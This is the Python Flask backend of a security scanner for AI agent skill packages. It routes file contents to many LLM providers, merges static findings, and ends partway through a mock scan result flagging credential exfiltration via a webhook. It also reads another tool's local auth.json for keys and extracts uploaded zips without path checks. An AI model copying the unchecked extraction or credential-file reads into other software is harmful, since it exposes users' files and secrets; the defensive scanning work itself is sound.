import os
import json
import urllib.request
import urllib.error
import tempfile
import zipfile
import threading
import webbrowser
import time
import uuid
import shutil
from pathlib import Path
from flask import Flask, request, jsonify, render_template

from scanner import scan

BASE_DIR = Path(__file__).parent.absolute()
SCANS_FILE = BASE_DIR / "scans.json"
CATALOG_FILE = BASE_DIR / "models_catalog.json"
SCANS = {}

app = Flask(__name__)

ENV_API_KEY_VARS = {
    "anthropic": "ANTHROPIC_API_KEY",
    "openai": "OPENAI_API_KEY",
    "gemini": "GEMINI_API_KEY",
    "google": "GEMINI_API_KEY",
    "deepseek": "DEEPSEEK_API_KEY",
    "groq": "GROQ_API_KEY",
    "openrouter": "OPENROUTER_API_KEY",
    "mistral": "MISTRAL_API_KEY",
    "xai": "XAI_API_KEY",
    "together": "TOGETHER_API_KEY",
    "togetherai": "TOGETHER_API_KEY",
    "fireworks": "FIREWORKS_API_KEY",
    "fireworks-ai": "FIREWORKS_API_KEY",
    "perplexity": "PERPLEXITY_API_KEY",
    "cerebras": "CEREBRAS_API_KEY",
    "cohere": "COHERE_API_KEY",
    "deepinfra": "DEEPINFRA_API_KEY",
    "siliconflow": "SILICONFLOW_API_KEY",
    "custom": "CUSTOM_API_KEY",
}

DEFAULT_BASE_URLS = {
    "deepseek": "https://api.deepseek.com",
    "groq": "https://api.groq.com/openai/v1",
    "openrouter": "https://openrouter.ai/api/v1",
    "mistral": "https://api.mistral.ai/v1",
    "xai": "https://api.x.ai/v1",
    "together": "https://api.together.xyz/v1",
    "togetherai": "https://api.together.xyz/v1",
    "fireworks": "https://api.fireworks.ai/inference/v1",
    "fireworks-ai": "https://api.fireworks.ai/inference/v1",
    "perplexity": "https://api.perplexity.ai",
    "cerebras": "https://api.cerebras.ai/v1",
    "deepinfra": "https://api.deepinfra.com/v1/openai",
    "siliconflow": "https://api.siliconflow.cn/v1",
    "ollama": "http://localhost:11434",
    "lmstudio": "http://localhost:1234/v1",
    "custom": "http://localhost:8000/v1"
}

BUILTIN_MODELS = {
    "anthropic": [
        "claude-3-7-sonnet",
        "claude-3-5-sonnet-latest",
        "claude-3-5-haiku-latest",
        "claude-3-opus-latest",
        "claude-3-5-sonnet-20241022",
        "claude-3-haiku-20240307"
    ],
    "openai": [
        "gpt-4o",
        "gpt-4o-mini",
        "o1",
        "o1-mini",
        "o3-mini",
        "gpt-4.5-preview",
        "gpt-4-turbo",
        "gpt-4",
        "gpt-3.5-turbo"
    ],
    "gemini": [
        "gemini-2.0-flash",
        "gemini-2.0-pro-exp-02-05",
        "gemini-2.0-flash-thinking-exp",
        "gemini-1.5-pro",
        "gemini-1.5-flash",
        "gemini-1.5-flash-8b"
    ],
    "deepseek": [
        "deepseek-chat",
        "deepseek-reasoner"
    ],
    "groq": [
        "llama-3.3-70b-versatile",
        "llama-3.1-8b-instant",
        "deepseek-r1-distill-llama-70b",
        "gemma2-9b-it",
        "mixtral-8x7b-32768"
    ],
    "openrouter": [
        "google/gemini-2.0-flash-001",
        "anthropic/claude-3.5-sonnet",
        "openai/gpt-4o",
        "deepseek/deepseek-chat",
        "meta-llama/llama-3.3-70b-instruct",
        "mistralai/mistral-large-2407",
        "meta-llama/llama-3.1-405b"
    ],
    "mistral": [
        "mistral-large-latest",
        "mistral-medium-latest",
        "mistral-small-latest",
        "codestral-latest"
    ],
    "xai": [
        "grok-2-latest",
        "grok-2",
        "grok-beta"
    ],
    "together": [
        "meta-llama/Llama-3.3-70B-Instruct-Turbo",
        "deepseek-ai/DeepSeek-R1",
        "Qwen/Qwen2.5-72B-Instruct-Turbo",
        "mistralai/Mixtral-8x22B-Instruct-v0.1"
    ],
    "togetherai": [
        "meta-llama/Llama-3.3-70B-Instruct-Turbo",
        "deepseek-ai/DeepSeek-R1",
        "Qwen/Qwen2.5-72B-Instruct-Turbo"
    ],
    "fireworks": [
        "accounts/fireworks/models/deepseek-r1",
        "accounts/fireworks/models/llama-v3p3-70b-instruct",
        "accounts/fireworks/models/qwen2p5-72b-instruct"
    ],
    "fireworks-ai": [
        "accounts/fireworks/models/deepseek-r1",
        "accounts/fireworks/models/llama-v3p3-70b-instruct",
        "accounts/fireworks/models/qwen2p5-72b-instruct"
    ],
    "perplexity": [
        "sonar-pro",
        "sonar",
        "sonar-reasoning"
    ],
    "cerebras": [
        "llama3.3-70b",
        "llama3.1-8b"
    ],
    "cohere": [
        "command-r-plus-08-2024",
        "command-r-08-2024",
        "command-r-plus",
        "command-r"
    ],
    "deepinfra": [
        "meta-llama/Meta-Llama-3.1-70B-Instruct",
        "deepseek-ai/DeepSeek-R1",
        "Qwen/Qwen2.5-72B-Instruct"
    ],
    "siliconflow": [
        "deepseek-ai/DeepSeek-V3",
        "deepseek-ai/DeepSeek-R1",
        "Qwen/Qwen2.5-72B-Instruct"
    ],
    "ollama": [
        "llama3.3", "llama3.2", "deepseek-r1", "qwen2.5", "mistral",
        "gemma2", "phi4", "phi3", "deepseek-coder", "codellama"
    ],
    "lmstudio": [
        "local-model", "loaded-model"
    ],
    "custom": [
        "custom-model", "default"
    ]
}

POPULAR_PROVIDERS = [
    "anthropic",
    "openai",
    "gemini",
    "deepseek",
    "groq",
    "openrouter",
    "mistral",
    "xai",
    "together",
    "fireworks",
    "perplexity",
    "nvidia",
    "cerebras",
    "cohere",
    "deepinfra",
    "siliconflow",
]

LOCAL_PROVIDERS = [
    "ollama",
    "lmstudio",
    "custom"
]

PROVIDER_ALIASES = {
    "google": "gemini",
    "gemini": "google",
    "togetherai": "together",
    "together": "togetherai",
    "fireworks-ai": "fireworks",
    "fireworks": "fireworks-ai"
}

# In-memory catalog of all 200+ providers and their models
DYNAMIC_CATALOG = {}

def _ensure_core_providers():
    global DYNAMIC_CATALOG
    # Ensure local runtimes
    if "ollama" not in DYNAMIC_CATALOG:
        DYNAMIC_CATALOG["ollama"] = {
            "id": "ollama",
            "name": "Ollama (Local)",
            "api": "http://localhost:11434",
            "env": [],
            "npm": "@ai-sdk/openai-compatible",
            "models": BUILTIN_MODELS.get("ollama", ["llama3.3", "llama3.2", "deepseek-r1"])
        }
    if "lmstudio" not in DYNAMIC_CATALOG:
        DYNAMIC_CATALOG["lmstudio"] = {
            "id": "lmstudio",
            "name": "LM Studio (Local)",
            "api": "http://localhost:1234/v1",
            "env": [],
            "npm": "@ai-sdk/openai-compatible",
            "models": BUILTIN_MODELS.get("lmstudio", ["local-model"])
        }
    if "custom" not in DYNAMIC_CATALOG:
        DYNAMIC_CATALOG["custom"] = {
            "id": "custom",
            "name": "Custom (OpenAI-Compatible)",
            "api": "http://localhost:8000/v1",
            "env": ["CUSTOM_API_KEY"],
            "npm": "@ai-sdk/openai-compatible",
            "models": BUILTIN_MODELS.get("custom", ["default", "custom-model"])
        }

    # Ensure aliases
    if "google" in DYNAMIC_CATALOG and "gemini" not in DYNAMIC_CATALOG:
        DYNAMIC_CATALOG["gemini"] = dict(DYNAMIC_CATALOG["google"])
        DYNAMIC_CATALOG["gemini"]["id"] = "gemini"
        DYNAMIC_CATALOG["gemini"]["name"] = "Google Gemini"
    if "togetherai" in DYNAMIC_CATALOG and "together" not in DYNAMIC_CATALOG:
        DYNAMIC_CATALOG["together"] = dict(DYNAMIC_CATALOG["togetherai"])
        DYNAMIC_CATALOG["together"]["id"] = "together"
    if "fireworks-ai" in DYNAMIC_CATALOG and "fireworks" not in DYNAMIC_CATALOG:
        DYNAMIC_CATALOG["fireworks"] = dict(DYNAMIC_CATALOG["fireworks-ai"])
        DYNAMIC_CATALOG["fireworks"]["id"] = "fireworks"

def _init_catalog():
    global DYNAMIC_CATALOG
    loaded = False

    # 1. First check local catalog file if present
    if CATALOG_FILE.exists():
        try:
            with open(CATALOG_FILE, 'r', encoding='utf-8') as f:
                disk_cat = json.load(f)
                for k, v in disk_cat.items():
                    if isinstance(v, dict):
                        DYNAMIC_CATALOG[k] = v
                    elif isinstance(v, list):
                        DYNAMIC_CATALOG[k] = {
                            "id": k,
                            "name": k.capitalize(),
                            "api": DEFAULT_BASE_URLS.get(k, ""),
                            "env": [ENV_API_KEY_VARS.get(k, f"{k.upper()}_API_KEY")],
                            "npm": "@ai-sdk/openai-compatible",
                            "models": v
                        }
                if len(DYNAMIC_CATALOG) > 10:
                    loaded = True
        except Exception:
            pass

    # 2. Check local opencode models.json cache
    if not loaded:
        local_cache = Path.home() / ".cache" / "opencode" / "models.json"
        if local_cache.exists():
            try:
                with open(local_cache, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for p_id, p_info in data.items():
                        DYNAMIC_CATALOG[p_id] = {
                            "id": p_id,
                            "name": p_info.get("name", p_id),
                            "api": p_info.get("api") or "",
                            "env": p_info.get("env") or [],
                            "npm": p_info.get("npm") or "",
                            "models": list(p_info.get("models", {}).keys())
                        }
                    loaded = True
            except Exception:
                pass

    # 3. Fallback to builtin models
    if not loaded:
        for k, v in BUILTIN_MODELS.items():
            DYNAMIC_CATALOG[k] = {
                "id": k,
                "name": k.capitalize(),
                "api": DEFAULT_BASE_URLS.get(k, ""),
                "env": [ENV_API_KEY_VARS.get(k, f"{k.upper()}_API_KEY")],
                "npm": "@ai-sdk/openai-compatible",
                "models": list(v)
            }

    _ensure_core_providers()

    # Background fetch to refresh catalog from models.dev if needed
    def refresh_worker():
        try:
            req = urllib.request.Request('https://models.dev/api.json', headers={'User-Agent': 'SkillScanner/1.0'})
            with urllib.request.urlopen(req, timeout=5) as r:
                data = json.loads(r.read().decode('utf-8'))
                for p_id, p_info in data.items():
                    m_list = list(p_info.get('models', {}).keys())
                    if m_list:
                        DYNAMIC_CATALOG[p_id] = {
                            "id": p_id,
                            "name": p_info.get("name", p_id),
                            "api": p_info.get("api") or "",
                            "env": p_info.get("env") or [],
                            "npm": p_info.get("npm") or "",
                            "models": m_list
                        }
                _ensure_core_providers()
                with open(CATALOG_FILE, 'w', encoding='utf-8') as f:
                    json.dump(DYNAMIC_CATALOG, f, indent=2)
        except Exception:
            pass

    threading.Thread(target=refresh_worker, daemon=True).start()

_init_catalog()

def _load_dotenv() -> None:
    env_path = BASE_DIR / ".env"
    if not env_path.exists():
        return
    try:
        for line in env_path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            k = k.strip()
            v = v.strip().strip('"').strip("'")
            if k and k not in os.environ:
                os.environ[k] = v
    except Exception:
        return

def _redact_secret(value: str) -> str:
    if not value:
        return value
    return f"[REDACTED...{value[-4:]}]"

def _redact_headers(headers: dict) -> dict:
    redacted = {}
    for k, v in (headers or {}).items():
        key = str(k)
        low = key.lower()
        if low in ("authorization", "x-api-key"):
            redacted[key] = _redact_secret(str(v))
        else:
            redacted[key] = v
    return redacted

def _resolve_provider_name(conf: dict) -> str:
    raw = conf.get("provider", "anthropic")
    return str(raw).strip().lower()

def _resolve_api_key(provider_name: str, provider_conf: dict) -> str:
    api_key = ""
    if isinstance(provider_conf, dict):
        api_key = str(provider_conf.get("api_key", "") or "").strip()

    if api_key and "YOUR_" not in api_key:
        return api_key

    # Check env vars
    env_vars = []
    if provider_name in ENV_API_KEY_VARS:
        env_vars.append(ENV_API_KEY_VARS[provider_name])

    cat_entry = DYNAMIC_CATALOG.get(provider_name) or {}
    if isinstance(cat_entry, dict) and cat_entry.get("env"):
        for ev in cat_entry["env"]:
            if ev not in env_vars:
                env_vars.append(ev)

    alias = PROVIDER_ALIASES.get(provider_name)
    if alias:
        alias_cat = DYNAMIC_CATALOG.get(alias) or {}
        if isinstance(alias_cat, dict) and alias_cat.get("env"):
            for ev in alias_cat["env"]:
                if ev not in env_vars:
                    env_vars.append(ev)

    for ev in env_vars:
        val = str(os.getenv(ev, "") or "").strip()
        if val:
            return val

    # Check common fallback keys
    if provider_name in ("gemini", "google"):
        for alt in ("GEMINI_API_KEY", "GOOGLE_API_KEY", "GOOGLE_GENERATIVE_AI_API_KEY"):
            val = str(os.getenv(alt, "") or "").strip()
            if val:
                return val

    # Check local saved auth credentials (e.g. from local environment)
    try:
        auth_file = Path.home() / ".local" / "share" / "opencode" / "auth.json"
        if auth_file.exists():
            with open(auth_file, "r", encoding="utf-8") as f:
                auth_data = json.load(f)
                for cand in (provider_name, alias):
                    if cand and cand in auth_data:
                        cand_entry = auth_data[cand]
                        if isinstance(cand_entry, dict) and cand_entry.get("key"):
                            return cand_entry["key"]
    except Exception:
        pass

    return api_key

def load_config():
    config_path = BASE_DIR / 'config.json'
    if config_path.exists():
        with open(config_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    print(f"Warning: No config.json found at {config_path}")
    return {}

def load_scans():
    if SCANS_FILE.exists():
        try:
            with open(SCANS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_scans():
    with open(SCANS_FILE, 'w', encoding='utf-8') as f:
        json.dump(SCANS, f, indent=2)

SCANS = load_scans()

def _get_provider_endpoint(provider_name: str, cfg: dict) -> str:
    base = cfg.get("base_url") or DEFAULT_BASE_URLS.get(provider_name, "")
    if not base:
        cat_entry = DYNAMIC_CATALOG.get(provider_name) or {}
        if isinstance(cat_entry, dict) and cat_entry.get("api"):
            base = cat_entry["api"]

    base = str(base).rstrip('/')

    if provider_name == "anthropic":
        return "https://api.anthropic.com/v1/messages"
    elif provider_name in ("gemini", "google"):
        return "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions"
    elif provider_name == "cohere":
        return f"{base}/chat" if base else "https://api.cohere.com/v2/chat"
    elif provider_name == "ollama":
        return f"{base}/api/chat" if base else "http://localhost:11434/api/chat"
    elif provider_name == "custom":
        if not base:
            base = "http://localhost:8000/v1"
        return base if base.endswith('/chat/completions') else f"{base}/chat/completions"
    else:
        # Standard OpenAI-compatible provider (covers 200+ providers)
        if not base:
            base = DEFAULT_BASE_URLS.get(provider_name, "https://api.openai.com/v1")
        return base if base.endswith('/chat/completions') else f"{base}/chat/completions"

def _get_provider_headers(provider_name: str, cfg: dict) -> dict:
    key = cfg.get("api_key", "")
    headers = {"Content-Type": "application/json"}
    if provider_name == "anthropic":
        headers["x-api-key"] = key
        headers["anthropic-version"] = "2023-06-01"
    elif provider_name == "openrouter":
        headers["Authorization"] = f"Bearer {key}"
        headers["HTTP-Referer"] = "https://github.com/patidarganesh/SkillScanner"
        headers["X-Title"] = "SkillScanner"
    elif provider_name in ("ollama",):
        pass # Ollama does not require auth header by default
    else:
        if key:
            headers["Authorization"] = f"Bearer {key}"
    return headers

def _get_provider_body(provider_name: str, model: str, system: str, user: str, json_mode: bool = True) -> dict:
    if provider_name == "anthropic":
        return {
            "model": model,
            "max_tokens": 8000,
            "system": system,
            "messages": [{"role": "user", "content": user}]
        }
    elif provider_name == "ollama":
        return {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "stream": False,
            "format": "json"
        }
    else:
        # Standard OpenAI compatible
        body = {
            "model": model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ]
        }
        if json_mode and not model.startswith("o1"):
            body["response_format"] = {"type": "json_object"}
        return body

def _extract_provider_response(provider_name: str, data: dict) -> str:
    if provider_name == "anthropic":
        return data["content"][0]["text"]
    elif provider_name == "ollama":
        return data["message"]["content"]
    elif provider_name == "cohere":
        if "message" in data and "content" in data["message"]:
            items = data["message"]["content"]
            if items and isinstance(items, list) and "text" in items[0]:
                return items[0]["text"]
        if "text" in data:
            return data["text"]
        if "choices" in data:
            return data["choices"][0]["message"]["content"]
        return str(data)
    else:
        # OpenAI style
        if "choices" in data and len(data["choices"]) > 0:
            msg = data["choices"][0].get("message", {})
            return msg.get("content", "")
        elif "content" in data:
            return str(data["content"])
        return str(data)

def clean_json(raw: str) -> str:
    raw = raw.strip()
    if raw.startswith("```"):
        lines = raw.split("\n")
        lines = [l for l in lines if not l.strip().startswith("```")]
        raw = "\n".join(lines).strip()
    return raw

def _execute_ai_request(provider_name: str, effective_conf: dict, model: str, system_prompt: str, user_payload: str, json_mode: bool = True) -> str:
    url = _get_provider_endpoint(provider_name, effective_conf)
    headers_dict = _get_provider_headers(provider_name, effective_conf)
    body_data = _get_provider_body(provider_name, model, system_prompt, user_payload, json_mode)
    data = json.dumps(body_data).encode("utf-8")

    req = urllib.request.Request(url, data=data, method="POST")
    for key, value in headers_dict.items():
        req.add_header(key, value)

    if "User-Agent" not in headers_dict:
        req.add_header("User-Agent", "SkillScanner/1.0 (Mozilla/5.0)")

    if str(os.getenv("SKILLSCAN_DEBUG_HTTP", "") or "").strip() == "1":
        print("--- DEBUG OUTGOING REQUEST ---")
        print("URL:", req.full_url)
        print("HEADERS:", _redact_headers(dict(req.headers)))
        print("------------------------------")

    with urllib.request.urlopen(req, timeout=180) as response:
        resp_body = response.read().decode("utf-8", errors="replace")
        resp_data = json.loads(resp_body)
        return _extract_provider_response(provider_name, resp_data)

def call_ai(payload: str) -> dict:
    _load_dotenv()
    conf = load_config()
    provider_name = _resolve_provider_name(conf)
    p_conf = conf.get(provider_name, {})
    cat_entry = DYNAMIC_CATALOG.get(provider_name) or {}
    available_models = cat_entry.get("models", []) if isinstance(cat_entry, dict) else (cat_entry if isinstance(cat_entry, list) else [])
    if not available_models:
        available_models = BUILTIN_MODELS.get(provider_name, ["default"])
    default_model = available_models[0] if available_models else "default"
    model = p_conf.get("model") or default_model

    api_key = _resolve_api_key(provider_name, p_conf)
    if provider_name not in ("ollama", "lmstudio"):
        if not api_key or "YOUR_" in api_key:
            env_hint = ENV_API_KEY_VARS.get(provider_name)
            hint = f" Set {env_hint} or configure it in Settings." if env_hint else " Configure it in Settings."
            raise Exception(f"API key for {provider_name} is missing.{hint}")

    effective_conf = dict(p_conf) if isinstance(p_conf, dict) else {}
    if api_key:
        effective_conf["api_key"] = api_key
    if "base_url" not in effective_conf and provider_name in DEFAULT_BASE_URLS:
        effective_conf["base_url"] = DEFAULT_BASE_URLS[provider_name]

    try:
        with open(BASE_DIR / "prompt.md", "r", encoding="utf-8") as f:
            system_prompt = f.read()
    except Exception:
        system_prompt = "Return raw JSON only."

    try:
        # First attempt with json_mode=True
        raw_text = _execute_ai_request(provider_name, effective_conf, model, system_prompt, payload, json_mode=True)
        clean_text = clean_json(raw_text)
        return json.loads(clean_text)
    except urllib.error.HTTPError as e:
        error_body = e.read().decode("utf-8", errors="replace")
        # If model doesn't support json_mode/response_format, retry once without response_format
        if "response_format" in error_body.lower() or "json_object" in error_body.lower():
            try:
                raw_text = _execute_ai_request(provider_name, effective_conf, model, system_prompt, payload, json_mode=False)
                clean_text = clean_json(raw_text)
                return json.loads(clean_text)
            except Exception:
                pass

        try:
            err_json = json.loads(error_body)
            error_msg = err_json.get("error", {}).get("message", error_body) if isinstance(err_json.get("error"), dict) else err_json.get("error", error_body)
            raise Exception(f"HTTPError {e.code}: {error_msg}")
        except Exception:
            raise Exception(f"HTTPError {e.code}: {error_body}")
    except Exception as e:
        raise Exception(f"AI API Error: {str(e)}")

def build_payload(scan_res: dict) -> str:
    parts = []
    parts.append("SKILL PACKAGE ANALYSIS REQUEST")
    parts.append("===============================")
    parts.append(f"Package: {scan_res.get('name', 'Unknown')}")
    parts.append(f"Input type: {scan_res.get('input_type', 'unknown')}")
    parts.append(f"Total readable files: {scan_res.get('readable_files', 0)}")
    parts.append(f"Skipped files: {scan_res.get('skipped_files', 0)}")
    parts.append("\nFILE STRUCTURE:")
    parts.append(scan_res.get('file_tree', ''))
    
    skipped = scan_res.get('skipped', [])
    if skipped:
        parts.append("\nSKIPPED FILES (unreadable / skipped types):")
        for s in skipped:
            parts.append(f"- {s.get('relative_path')} ({s.get('reason')})")

    static_findings = scan_res.get('static_findings', [])
    if static_findings:
        parts.append("\n===============================")
        parts.append("STATIC SECURITY CHECKS & EVASION ALERTS:")
        parts.append("===============================")
        for sf in static_findings:
            parts.append(f"[{sf.get('severity', 'info').upper()}] {sf.get('title')}: {sf.get('description')} (Location: {sf.get('location')})")

    cross_refs = scan_res.get('cross_references', [])
    if cross_refs:
        parts.append("\nDETECTED CROSS-REFERENCES TO SKIPPED PATHS OR FILES:")
        for cr in cross_refs:
            parts.append(f"- {cr.get('source')} -> {cr.get('target')} (Type: {cr.get('type')})")
            
    parts.append("\n===============================")
    parts.append("FILE CONTENTS & EXTRACTED LOGIC:")
    parts.append("===============================\n")
    
    for f in scan_res.get('files', []):
        note = f" [{f.get('special_note')}]" if f.get('special_note') else ""
        parts.append(f"--- FILE: {f.get('relative_path')} ({f.get('size_bytes')} bytes){note} ---")
        parts.append(f.get('content', ''))
        parts.append("\n")
        
    return "\n".join(parts)

def run_analysis_task(scan_id, path=None, is_folder=False, extract_dir=None, file_name=None):
    try:
        SCANS[scan_id]["status"] = "processing"
        
        target_path = path if path else extract_dir
        scan_res = scan(target_path)
        
        if not path and file_name:
            if is_folder and file_name != "Upload":
                scan_res['name'] = file_name
            elif not is_folder:
                dirs = os.listdir(extract_dir)
                if len(dirs) == 1 and os.path.isdir(os.path.join(extract_dir, dirs[0])):
                    scan_res['name'] = dirs[0]
                else:
                    scan_res['name'] = file_name
            
        payload = build_payload(scan_res)

        # Guard: if no readable files were found, skip AI and show a clear error
        readable = scan_res.get('readable_files', 0) or len(scan_res.get('files', []))
        if readable == 0:
            skipped_exts = list({os.path.splitext(s.get('relative_path',''))[1] for s in scan_res.get('skipped', [])})[:6]
            ext_hint = ', '.join(skipped_exts) if skipped_exts else 'unknown types'
            raise ValueError(
                f"No readable source files found in \"{scan_res.get('name', 'this folder')}\". "
                f"The folder appears to contain only unsupported file types ({ext_hint}). "
                f"SkillScanner analyzes code, config, and text files — not images or binaries."
            )

        ai_res = call_ai(payload)

        # Merge static findings into ai_res so no bypass or evasion goes unnoticed
        static_findings = scan_res.get("static_findings", [])
        if static_findings:
            if "threat_findings" not in ai_res or not isinstance(ai_res["threat_findings"], list):
                ai_res["threat_findings"] = []

            existing_titles = {str(f.get("title", "")).lower() for f in ai_res["threat_findings"]}
            for sf in static_findings:
                if str(sf.get("title", "")).lower() not in existing_titles:
                    ai_res["threat_findings"].append(sf)

            severities = [str(f.get("severity", "")).lower() for f in ai_res["threat_findings"]]
            has_critical = "critical" in severities
            has_high = "high" in severities

            if has_critical:
                ai_res["threat_level"] = "CRITICAL"
                ai_res["verdict"] = "Malicious"
                ai_res["safe_to_use"] = False
                if ai_res.get("overall_score", 100) > 25:
                    ai_res["overall_score"] = 15
            elif has_high:
                if ai_res.get("threat_level") in ("SAFE", "LOW", "MEDIUM", None):
                    ai_res["threat_level"] = "HIGH"
                if ai_res.get("verdict") in ("Clean", "Trusted", None):
                    ai_res["verdict"] = "Suspicious"
                ai_res["safe_to_use"] = False
                if ai_res.get("overall_score", 100) > 45:
                    ai_res["overall_score"] = 40

            stats = ai_res.get("stats", {})
            stats["critical"] = severities.count("critical")
            stats["high"] = severities.count("high")
            stats["medium"] = severities.count("medium")
            stats["low"] = severities.count("low")
            stats["info"] = severities.count("info")
            stats["total_threats"] = len(ai_res["threat_findings"])
            ai_res["stats"] = stats
        
        for f in scan_res.get('files', []):
            if 'content' in f:
                del f['content']
                
        SCANS[scan_id]["result"] = ai_res
        SCANS[scan_id]["scan_summary"] = scan_res
        SCANS[scan_id]["status"] = "completed"
        save_scans()
    except SystemExit as se:
        SCANS[scan_id]["status"] = "error"
        SCANS[scan_id]["error"] = "The scan process exited unexpectedly. This usually means the folder had no readable files or was empty."
        save_scans()
    except Exception as e:
        import traceback as _tb
        err_str = str(e).strip()
        if not err_str or err_str == '0':
            err_str = "An unexpected error occurred during analysis. The folder may be empty or contain only unsupported file types."
        SCANS[scan_id]["status"] = "error"
        SCANS[scan_id]["error"] = err_str
        SCANS[scan_id]["error_detail"] = _tb.format_exc()
        save_scans()
    finally:
        if extract_dir:
            try:
                shutil.rmtree(extract_dir)
            except Exception:
                pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    from flask import Response
    # Inline SVG favicon — green shield matching the brand
    svg = (
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">'
        '<rect width="32" height="32" rx="6" fill="#030712"/>'
        '<path d="M16 4 L27 8 L27 16 C27 22 22 27 16 28 C10 27 5 22 5 16 L5 8 Z" fill="#10b981"/>'
        '<path d="M12 16 L15 19 L21 13" stroke="#030712" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>'
        '</svg>'
    )
    return Response(svg, mimetype='image/svg+xml')

@app.route('/results/<scan_id>')
def results_page(scan_id):
    return render_template('results.html')

@app.route('/api/scans', methods=['GET', 'DELETE'])
def handle_scans():
    if request.method == 'DELETE':
        SCANS.clear()
        save_scans()
        return jsonify({"success": True})
        
    history = []
    for s_id, data in SCANS.items():
        if data.get("status") in ["completed", "error"]:
            summary = data.get("scan_summary", {})
            result = data.get("result", {})
            history.append({
                "id": s_id,
                "name": data.get("name") or summary.get("name", "Unknown Analysis"),
                "status": data.get("status"),
                "timestamp": data.get("timestamp", 0),
                "verdict": result.get("verdict", "N/A"),
                "score": result.get("overall_score", 0)
            })
    history.sort(key=lambda x: x["timestamp"], reverse=True)
    return jsonify({"success": True, "history": history})

@app.route('/api/scan/<scan_id>', methods=['GET'])
def get_scan(scan_id):
    if scan_id not in SCANS:
        return jsonify({"success": False, "error": "Scan not found"}), 404
    return jsonify({"success": True, "data": SCANS[scan_id]})

@app.route('/api/scan/<scan_id>', methods=['PUT', 'DELETE'])
def modify_scan(scan_id):
    if scan_id not in SCANS:
        return jsonify({"success": False, "error": "Scan not found"}), 404
        
    if request.method == 'DELETE':
        del SCANS[scan_id]
        save_scans()
        return jsonify({"success": True})
        
    if request.method == 'PUT':
        data = request.json
        if data and "name" in data:
            SCANS[scan_id]["name"] = data["name"]
            save_scans()
            return jsonify({"success": True})
        return jsonify({"success": False, "error": "No name provided"}), 400

@app.route('/analyse', methods=['POST'])
def analyse():
    data = request.json
    if not data or 'path' not in data:
        return jsonify({"success": False, "error": "Missing path"}), 400
        
    path = str(data['path']).strip().strip('"').strip("'")
    if not os.path.exists(path):
        return jsonify({"success": False, "error": f"Path not found: {path}"}), 404
        
    scan_id = str(uuid.uuid4())
    SCANS[scan_id] = {
        "status": "pending", 
        "timestamp": time.time(),
        "name": os.path.basename(path) or path
    }
    save_scans()
    threading.Thread(target=run_analysis_task, args=(scan_id, path, False, None, None)).start()
    return jsonify({"success": True, "scan_id": scan_id})

@app.route('/analyse-zip', methods=['POST'])
def analyse_zip():
    if 'file' not in request.files:
        return jsonify({"success": False, "error": "No file uploaded"}), 400
        
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "error": "No file selected"}), 400
        
    if not file.filename.lower().endswith('.zip'):
        return jsonify({"success": False, "error": "Must be a .zip file"}), 400
        
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, "uploaded.zip")
    extract_dir = os.path.join(temp_dir, "extracted")
    
    try:
        file.save(zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(extract_dir)
            
        scan_id = str(uuid.uuid4())
        SCANS[scan_id] = {
            "status": "pending", 
            "timestamp": time.time(),
            "name": file.filename
        }
        save_scans()
        threading.Thread(target=run_analysis_task, args=(scan_id, None, False, extract_dir, file.filename)).start()
        return jsonify({"success": True, "scan_id": scan_id})
    except Exception as e:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/analyse-folder', methods=['POST'])
@app.route('/analyse-folder-upload', methods=['POST'])
def analyse_folder():
    files = request.files.getlist('files')
    paths = request.form.getlist('paths')
    
    if not files or len(files) == 0:
        return jsonify({"success": False, "error": "No files uploaded"}), 400
        
    temp_dir = tempfile.mkdtemp()
    extract_dir = os.path.join(temp_dir, "folder")
    os.makedirs(extract_dir, exist_ok=True)
    
    root_folder_name = "Uploaded Folder"
    if paths and len(paths) > 0:
        first_path = paths[0].replace('\\', '/')
        if '/' in first_path:
            root_folder_name = first_path.split('/')[0]

    try:
        for idx, file in enumerate(files):
            rel_path = paths[idx] if idx < len(paths) and paths[idx] else (file.filename or f"file_{idx}")
            clean_rel = os.path.normpath(rel_path.replace('\\', '/')).lstrip('/\\.')
            target_file_path = os.path.join(extract_dir, clean_rel)
            os.makedirs(os.path.dirname(target_file_path), exist_ok=True)
            file.save(target_file_path)
            
        scan_id = str(uuid.uuid4())
        SCANS[scan_id] = {
            "status": "pending", 
            "timestamp": time.time(),
            "name": root_folder_name
        }
        save_scans()
        threading.Thread(target=run_analysis_task, args=(scan_id, None, True, extract_dir, root_folder_name)).start()
        return jsonify({"success": True, "scan_id": scan_id})
    except Exception as e:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/dummy', methods=['POST'])
@app.route('/api/dummy-scan', methods=['POST'])
def dummy_scan():
    scan_id = str(uuid.uuid4())
    SCANS[scan_id] = {
        "status": "completed",
        "timestamp": time.time(),
        "name": "test-auth-package"
    }
    SCANS[scan_id]["scan_summary"] = {
        "name": "test-auth-package",
        "input_type": "folder",
        "readable_files": 8,
        "skipped_files": 2,
        "file_tree": "test-auth-package/\n├── SKILL.md\n├── _meta.json\n└── src/\n    ├── api.js\n    └── utils.js"
    }
    SCANS[scan_id]["result"] = {
        "package_name": "test-auth-package",
        "package_purpose": "Authentication utility for AI agents",
        "threat_level": "CRITICAL",
        "overall_score": 18,
        "verdict": "Malicious",
        "summary": "This package claims to be an auth utility but contains active credential exfiltration and an unauthorized outbound network connection. DO NOT USE.",
        "safe_to_use": False,
        "threat_findings": [
            {
                "id": 1,
                "category": "data_exfiltration",
                "severity": "critical",
                "title": "Credential Exfiltration via Webhook",
